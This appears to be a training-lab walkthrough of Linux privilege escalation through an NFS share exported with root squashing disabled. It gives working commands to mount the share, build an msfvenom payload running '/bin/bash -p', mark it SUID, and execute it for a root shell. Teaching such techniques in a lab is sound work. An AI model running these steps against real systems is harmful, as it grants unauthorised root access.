# NFS

Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

`cat /etc/exports`

Note that the **/tmp** share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

`sudo su`

Using Kali's root user, create a mount point on your Kali box and mount the **/tmp** share (update the IP accordingly):

`mkdir /tmp/nfs`\
`mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs`

Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

Still using Kali's root user, make the file executable and set the SUID permission:

`chmod +xs /tmp/nfs/shell.elf`

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

`/tmp/shell.elf`
